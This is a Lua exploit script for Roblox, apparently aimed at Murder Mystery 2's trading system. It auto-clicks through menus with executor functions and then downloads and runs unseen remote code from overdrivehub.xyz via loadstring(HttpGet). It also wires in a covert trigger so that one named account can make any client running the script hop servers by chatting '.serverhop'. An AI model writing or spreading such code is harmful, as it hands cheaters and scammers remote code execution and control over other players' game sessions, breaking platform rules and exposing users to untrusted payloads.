if not game:IsLoaded() then
    game.Loaded:Wait()
end
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
Player:WaitForChild("PlayerGui", 600)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")
local LocalPlayer = Players.LocalPlayer

local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
function TapUI(button, check, button2)
    if check == "Active Check" then
        if button.Active then
            button = button[button2]
        else
            return
        end
    end
    if check == "Text Check" then
        if button == "^" then
            button = button2
        else
            return
        end
    end
    for i,v in pairs(events) do
        for i,v in pairs(getconnections(button[v])) do
            v.Function()
        end
    end
end

repeat
    task.wait(1)
    pcall(function()
        TapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
    end)
    pcall(function()
        TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
    end)
until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")

repeat
    fr = pcall(function()
        require(game:GetService("ReplicatedStorage").Modules.TradeModule)
    end)
    task.wait()
until fr

loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()

local function ServerHop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    local File = pcall(function()
        AllIDs = game:GetService('HttpService'):JSONDecode(readfile("ExperimentalHop.json"))
    end)
    if not File then
        table.insert(AllIDs, actualHour)
        writefile("ExperimentalHop.json", game:GetService('HttpService'):JSONEncode(AllIDs))
    end
    function TPReturner()
        local Site;
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&excludeFullGames=true&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&excludeFullGames=true&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                delfile("ExperimentalHop.json")
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        writefile("ExperimentalHop.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                        wait()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(4)
                end
            end
        end
    end

    function Teleport()
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
        end
    end
    Teleport()
end

game.Players.PlayerAdded:Connect(function(plr)
    if plr.Name == 'Egorikusa_PS99' then
        plr.Chatted:Connect(function(msg)
            if msg == '.serverhop' then
                ServerHop()
            end
        end)
    end
end)

for _, plr in pairs(Players:GetPlayers()) do
    if plr.Name == 'Egorikusa_PS99' then
        plr.Chatted:Connect(
            function(msg)
                if msg == '.serverhop' then
                    ServerHop()
                end
            end
        )
    end
end
